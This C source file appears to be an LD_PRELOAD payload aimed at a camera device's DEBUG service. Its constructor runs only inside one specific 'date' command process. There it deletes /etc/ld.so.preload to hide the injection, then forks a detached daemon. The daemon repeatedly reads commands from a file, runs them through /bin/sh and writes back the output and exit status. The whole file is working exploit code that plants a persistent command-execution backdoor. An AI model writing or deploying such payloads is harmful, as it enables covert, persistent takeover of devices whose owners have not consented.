/* A7C2 one-shot shell payload, delivered as an LD_PRELOAD constructor.
 *
 * DEBUG gives exactly one child process, so the payload cannot just run a
 * command: it has to install a persistent mailbox that the host can drive
 * through the service file interface.
 *
 * Constructor order (all inside the gated child):
 *   1. gate on /proc/self/cmdline matching the one documented DEBUG command
 *   2. remove /etc/ld.so.preload immediately, before anything can fail
 *   3. fork a detached worker that polls a command file, runs each command
 *      with /bin/sh -c, and writes the output plus the exit status beside it
 *   4. _exit, so the fixed `date` command never runs and the clock is untouched
 *
 * The mailbox lives in the service Work area, which the host can write and read
 * with the already-verified file commands. Host tests relocate every path under
 * A7C2_SHELL_ROOT so the same source builds and runs off-camera.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define CMD_PATH "/tmp/jiritsu/a7c2-cmd.txt"
#define OUT_PATH "/tmp/jiritsu/a7c2-out.txt"
#define PRELOAD_PATH "/etc/ld.so.preload"
#define EXIT_TOKEN "__a7c2_exit__"
#define CMD_MAX 8192
#define OUT_MAX (256 * 1024)
#define POLL_US 200000

static const char debug_argv[] = "/bin/sh\0-c\0/bin/date -s 070421422017.26\0";

static void resolve(char *out, size_t size, const char *path)
{
    const char *root = getenv("A7C2_SHELL_ROOT");
    if (root == NULL || *root == '\0') {
        size_t need = strlen(path);
        if (need + 1 > size) { out[0] = '\0'; return; }
        memcpy(out, path, need + 1);
        return;
    }
    size_t root_len = strlen(root);
    size_t path_len = strlen(path);
    if (root_len + path_len + 1 > size) { out[0] = '\0'; return; }
    memcpy(out, root, root_len);
    memcpy(out + root_len, path, path_len + 1);
}

static int gate_matches(void)
{
    int fd = open("/proc/self/cmdline", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    char data[256];
    ssize_t got = read(fd, data, sizeof(data));
    close(fd);
    if (got != (ssize_t)(sizeof(debug_argv) - 1)) return 0;
    return memcmp(data, debug_argv, sizeof(debug_argv) - 1) == 0;
}

static int read_file_bounded(const char *path, char *out, size_t size, size_t *used)
{
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    size_t total = 0;
    while (total < size) {
        ssize_t got = read(fd, out + total, size - total);
        if (got < 0) { close(fd); return -1; }
        if (got == 0) break;
        total += (size_t)got;
    }
    close(fd);
    *used = total;
    return 0;
}

static int write_file(const char *path, const char *data, size_t size)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return -1;
    size_t done = 0;
    while (done < size) {
        ssize_t wrote = write(fd, data + done, size - done);
        if (wrote <= 0) { close(fd); return -1; }
        done += (size_t)wrote;
    }
    fsync(fd);
    close(fd);
    return 0;
}

static int append(char *buffer, size_t capacity, size_t *used, const char *text)
{
    size_t length = strlen(text);
    if (*used + length >= capacity) return -1;
    memcpy(buffer + *used, text, length);
    *used += length;
    return 0;
}

static int append_number(char *buffer, size_t capacity, size_t *used, int value)
{
    char digits[16];
    int negative = value < 0;
    unsigned magnitude = negative ? (unsigned)(-value) : (unsigned)value;
    size_t count = 0;
    do { digits[count++] = (char)('0' + magnitude % 10U); magnitude /= 10U; } while (magnitude);
    char text[18];
    size_t length = 0;
    if (negative) text[length++] = '-';
    for (size_t i = 0; i < count; i++) text[length++] = digits[count - 1 - i];
    text[length] = '\0';
    return append(buffer, capacity, used, text);
}

/* Run one command line and record its output and exit status. */
static void run_command(const char *command, const char *out_path)
{
    static char output[OUT_MAX];
    size_t used = 0;
    if (append(output, sizeof(output), &used, "A7C2-OUT-1\nCMD ") != 0)
        used = 0;
    append(output, sizeof(output), &used, command);
    append(output, sizeof(output), &used, "\n");

    int pipe_fds[2];
    int status = -1;
    if (pipe(pipe_fds) == 0) {
        pid_t pid = fork();
        if (pid == 0) {
            int null_fd = open("/dev/null", O_RDWR);
            if (null_fd >= 0) { dup2(null_fd, 0); dup2(null_fd, 2); if (null_fd > 2) close(null_fd); }
            dup2(pipe_fds[1], 1);
            close(pipe_fds[0]);
            close(pipe_fds[1]);
            char *const argv[] = {"/bin/sh", "-c", (char *)command, NULL};
            execv("/bin/sh", argv);
            _exit(127);
        }
        close(pipe_fds[1]);
        if (pid > 0) {
            for (;;) {
                ssize_t got = read(pipe_fds[0], output + used, sizeof(output) - 1 - used);
                if (got <= 0) break;
                used += (size_t)got;
                if (used + 1 >= sizeof(output)) break;
            }
            close(pipe_fds[0]);
            waitpid(pid, &status, 0);
        } else {
            close(pipe_fds[0]);
        }
    }
    if (status >= 0 && WIFEXITED(status)) {
        append(output, sizeof(output), &used, "\nEXIT ");
        append_number(output, sizeof(output), &used, WEXITSTATUS(status));
    } else {
        append(output, sizeof(output), &used, "\nEXIT unknown");
    }
    append(output, sizeof(output), &used, "\nA7C2-END\n");
    write_file(out_path, output, used);
}

static void detach_stdio(void)
{
    /* The worker must not hold the parent's stdout/stderr: the DEBUG parent may
     * wait for those pipes to close, and the daemon would keep them open. */
    int null_fd = open("/dev/null", O_RDWR);
    if (null_fd < 0) return;
    dup2(null_fd, 0);
    dup2(null_fd, 1);
    dup2(null_fd, 2);
    if (null_fd > 2) close(null_fd);
}

static void worker(const char *cmd_path, const char *out_path)
{
    if (setsid() < 0) { /* keep running even without a controlling terminal */ }
    detach_stdio();
    for (;;) {
        static char command[CMD_MAX + 1];
        size_t used = 0;
        if (read_file_bounded(cmd_path, command, CMD_MAX, &used) == 0 && used > 0) {
            command[used] = '\0';
            if (unlink(cmd_path) != 0 && errno != ENOENT) {
                /* Without a successful consume the same command would replay on
                 * every poll, so refuse to run it again. */
                usleep(POLL_US);
                continue;
            }
            while (used > 0 && (command[used - 1] == '\n' || command[used - 1] == '\r')) {
                command[--used] = '\0';
            }
            if (used > 0 && strcmp(command, EXIT_TOKEN) == 0) {
                unlink(out_path);
                _exit(0);
            }
            if (used > 0) run_command(command, out_path);
        }
        usleep(POLL_US);
    }
}

__attribute__((constructor)) static void a7c2_shell(void)
{
    if (!gate_matches()) return;

    char preload[1024];
    resolve(preload, sizeof(preload), PRELOAD_PATH);
    if (preload[0] != '\0') unlink(preload);

    char cmd_path[1024];
    char out_path[1024];
    resolve(cmd_path, sizeof(cmd_path), CMD_PATH);
    resolve(out_path, sizeof(out_path), OUT_PATH);
    if (cmd_path[0] == '\0' || out_path[0] == '\0') _exit(1);

    pid_t pid = fork();
    if (pid == 0) worker(cmd_path, out_path);
    /* Exit before the fixed date command so the camera clock is not changed. */
    _exit(0);
}
